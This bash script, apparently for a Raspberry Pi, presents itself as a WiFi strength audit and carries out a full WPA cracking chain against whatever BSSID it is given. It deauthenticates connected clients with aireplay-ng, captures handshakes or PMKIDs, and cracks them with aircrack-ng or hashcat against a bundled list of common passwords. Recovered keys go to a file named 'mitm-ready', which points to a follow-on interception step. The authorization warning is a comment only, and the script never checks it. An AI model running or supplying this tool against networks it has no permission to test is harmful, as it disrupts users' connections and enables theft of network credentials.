#!/bin/bash
# Pineapple Express - WiFi strength audit (capture handshake + dictionary crack)
# Args: [BSSID] [channel].  Blank BSSID = your own AP (wlan0). Channel auto-detected if blank.
# USE ONLY on networks you OWN or are AUTHORIZED (owner's permission) to test.
R=/opt/pinacola/wifitest.result
ts(){ date +%H:%M:%S; }
log(){ echo "[$(ts)] $*" > "$R"; }
TBSSID="$1"; TCH="$2"; OWN=0; CLI=""; SSID=""
trap 'systemctl start kismet-sensor.service 2>/dev/null' EXIT

if [ -z "$TBSSID" ]; then
  TBSSID=$(cat /sys/class/net/wlan0/address 2>/dev/null)
  TCH=$(iw dev wlan0 info 2>/dev/null | awk '/channel/{print $2}')
  SSID=$(iw dev wlan0 info 2>/dev/null | awk '/ssid/{print $2}')
  OWN=1
fi

log "objetivo $TBSSID - preparando..."

if [ "$OWN" = 1 ]; then
  CLI=$(iw dev wlan0 station dump 2>/dev/null | awk '/Station/{print $2; exit}')
  if [ -z "$CLI" ]; then
    log "X  Conecta un dispositivo a TU AP primero (0 clientes)."
    exit 0
  fi
fi

# --- liberar wlan1 de Kismet ---
systemctl stop kismet-sensor.service 2>/dev/null
sleep 0.5
pkill -9 -f 'kismet_cap_linux_wifi' 2>/dev/null
sleep 1

WLAN1_MODE=$(iw dev wlan1 info 2>/dev/null | awk '/type/{print $2}')
if [ "$WLAN1_MODE" != "monitor" ]; then
  nmcli dev set wlan1 managed no 2>/dev/null
  ip link set wlan1 down
  iw dev wlan1 set type monitor
  ip link set wlan1 up
  sleep 0.5
  WLAN1_MODE=$(iw dev wlan1 info 2>/dev/null | awk '/type/{print $2}')
  if [ "$WLAN1_MODE" != "monitor" ]; then
    log "X  wlan1 no entro en modo monitor (modo: ${WLAN1_MODE:-desconocido}). Reinicia la Pi."
    exit 1
  fi
fi

# --- auto-detectar canal ---
if [ -z "$TCH" ] || [ "$TCH" = "auto" ]; then
  log "buscando canal de $TBSSID (escaneo ~14s)..."
  rm -f /tmp/scan-*.csv 2>/dev/null
  timeout 14 airodump-ng --output-format csv -w /tmp/scan wlan1 >/dev/null 2>/tmp/wt-scan.log
  TCH=$(grep -i "$TBSSID" /tmp/scan-01.csv 2>/dev/null | head -1 | awk -F, '{gsub(/ /,"",$4); print $4}')
  SSID=$(grep -i "$TBSSID" /tmp/scan-01.csv 2>/dev/null | head -1 | awk -F, '{gsub(/^ +| +$/,"",$14); print $14}')
  if [ -z "$TCH" ] || [ "$TCH" = "-1" ]; then
    log "X  No encontre $TBSSID en el aire. Causas: (1) red en 5 GHz (2) BSSID incorrecto (3) fuera de alcance."
    exit 0
  fi
  if [ "$TCH" -gt 13 ] 2>/dev/null; then
    log "X  Red en 5 GHz (canal $TCH) - wlan1 solo cubre 2.4 GHz."
    exit 0
  fi
fi

iw dev wlan1 set channel "$TCH"
log "canal $TCH - capturando 60s con 3 deauths dirigidos..."

# Limpiar caps anteriores + zombies
pkill -9 -f 'airodump-ng' 2>/dev/null
sleep 0.3
rm -f /tmp/wt-*.cap /tmp/wt-*.csv 2>/dev/null

timeout 60 airodump-ng -c "$TCH" --bssid "$TBSSID" -w /tmp/wt wlan1 >/dev/null 2>/tmp/wt-cap.log &
ADPID=$!

# Extraer clientes del CSV de captura en curso asociados al BSSID objetivo
get_clients_csv(){
  local csv
  csv=$(ls -t /tmp/wt-*.csv 2>/dev/null | head -1)
  [ -z "$csv" ] && return
  awk -F',' -v bssid="$TBSSID" '
    /^Station MAC/{ in_st=1; next }
    in_st && NF>=6 {
      mac=$1; gsub(/ /,"",mac)
      ap=$6;  gsub(/ /,"",ap)
      if (length(mac)==17 && toupper(ap)==toupper(bssid)) print mac
    }
  ' "$csv" 2>/dev/null
}

# 3 bursts de deauth: t=5s, t=15s, t=25s
# deauth dirigido si hay clientes en el CSV; broadcast como fallback
sleep 5
for burst in 1 2 3; do
  CLIENTS=$(get_clients_csv)
  [ -z "$CLIENTS" ] && CLIENTS="$CLI"
  if [ -n "$CLIENTS" ]; then
    for c in $CLIENTS; do
      timeout 3 aireplay-ng -0 5 -a "$TBSSID" -c "$c" wlan1 >/dev/null 2>&1
    done
  else
    timeout 3 aireplay-ng -0 5 -a "$TBSSID" wlan1 >/dev/null 2>&1
  fi
  [ $burst -lt 3 ] && sleep 10
done

wait $ADPID 2>/dev/null

CAPFILE=$(ls -t /tmp/wt-*.cap 2>/dev/null | head -1)
CAP_SIZE=$(stat -c%s "$CAPFILE" 2>/dev/null || echo 0)

if [ -z "$CAPFILE" ] || [ "$CAP_SIZE" -le 24 ]; then
  log "X  Sin captura (${CAP_SIZE}B). Sin clientes o wlan1 sin alcance."
  exit 0
fi

# Wordlist con passwords comunes
cat > /tmp/wt-wl.txt << 'WORDLIST'
12345678
admin1234
pineapple123
qwerty123
movistar1
password
1234567890
familia2024
password1
password123
qwerty
12345
123456
123456789
wifi1234
home1234
movistar
orange
vodafone
micasa
wifi123
wifi12345
wifi2024
router
admin
default
internet
1234abcd
abcd1234
casa1234
WORDLIST

log "crackeando handshake (cap: ${CAP_SIZE}B, max 60s)..."
OUT=$(timeout 60 aircrack-ng -w /tmp/wt-wl.txt -b "$TBSSID" "$CAPFILE" </dev/null 2>&1)
OUT=$(printf '%s' "$OUT" | sed 's/\x1b\[[0-9;]*[A-Za-z]//g' | tr -d '\r')

if echo "$OUT" | grep -q "KEY FOUND!"; then
  KEY=$(echo "$OUT" | grep "KEY FOUND" | head -1 | sed -E 's/.*\[ *(.*[^ ]) *\].*/\1/')
  log "DEBIL - contrasena crackeada: \"$KEY\". Usa una contrasena larga y aleatoria."
  printf 'BSSID=%s\nKEY=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$KEY" "$SSID" "$TCH" > /opt/pinacola/mitm-ready

elif echo "$OUT" | grep -qiE "passphrase not|not in the dictionary|KEY NOT FOUND"; then
  log "FUERTE - handshake capturado (${CAP_SIZE}B) y contrasena resistio el diccionario."

elif echo "$OUT" | grep -qiE "no valid wpa|no networks found|got no data|quitting aircrack|0 handshake"; then
  # --- PMKID fallback (hcxdumptool v7) ---
  if ! command -v hcxdumptool >/dev/null 2>&1 || ! command -v hcxpcapngtool >/dev/null 2>&1; then
    log "Sin handshake. hcxdumptool no instalado (apt install hcxdumptool hcxtools)."
    exit 0
  fi

  log "Sin handshake (0 EAPOL). Probando PMKID (30s)..."

  rm -f /tmp/pmkid.pcapng /tmp/pmkid.bpf /tmp/pmkid.hash

  # v7 gestiona la interfaz sola: ponerla en managed para que hcxdumptool pueda tomarla
  pkill -9 -f 'airodump-ng' 2>/dev/null
  ip link set wlan1 down
  iw dev wlan1 set type managed 2>/dev/null
  ip link set wlan1 up
  sleep 0.5

  # BPF filter: solo frames de/para nuestro AP (addr3 = BSSID en management frames)
  hcxdumptool --bpfc="wlan addr3 $TBSSID" > /tmp/pmkid.bpf 2>/dev/null

  # Canal 2.4GHz: sufijo 'a' obligatorio en v7 (e.g. 6a)
  # --exitoneapol=1: salir al capturar el primer PMKID
  timeout 35 hcxdumptool -i wlan1 -c "${TCH}a" \
    --bpf=/tmp/pmkid.bpf \
    --exitoneapol=1 \
    -w /tmp/pmkid.pcapng \
    2>/tmp/pmkid.log

  # Restaurar monitor para que kismet vuelva al salir del script
  ip link set wlan1 down
  iw dev wlan1 set type monitor 2>/dev/null
  ip link set wlan1 up

  if [ ! -s /tmp/pmkid.pcapng ]; then
    log "Sin PMKID (AP con 802.11w MFP total o fuera de alcance)."
    exit 0
  fi

  # Convertir a formato hashcat 22000 (WPA-PBKDF2-PMKID+EAPOL)
  hcxpcapngtool -o /tmp/pmkid.hash /tmp/pmkid.pcapng 2>/dev/null

  if [ ! -s /tmp/pmkid.hash ]; then
    log "PMKID pcapng capturado pero sin hashes extraibles."
    exit 0
  fi

  NHASH=$(wc -l < /tmp/pmkid.hash)
  log "PMKID capturado ($NHASH hash). Crackeando con hashcat..."

  POTFILE=/tmp/pmkid-$$.pot
  timeout 120 hashcat -m 22000 /tmp/pmkid.hash /tmp/wt-wl.txt \
    --force --quiet --potfile-path="$POTFILE" 2>/tmp/hashcat.log

  CRACKED=$(hashcat -m 22000 /tmp/pmkid.hash --show --potfile-path="$POTFILE" 2>/dev/null \
    | head -1 | sed 's/.*://')
  rm -f "$POTFILE"

  if [ -n "$CRACKED" ]; then
    log "DEBIL (PMKID) - contrasena crackeada: \"$CRACKED\". Usa una larga y aleatoria."
    printf 'BSSID=%s\nKEY=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$CRACKED" "$SSID" "$TCH" > /opt/pinacola/mitm-ready
  else
    log "FUERTE - PMKID capturado pero contrasena no en diccionario."
  fi

else
  log "Resultado inesperado. Cap: ${CAP_SIZE}B. Aircrack: $(echo "$OUT" | tail -3 | tr '\n' ' ')"
fi
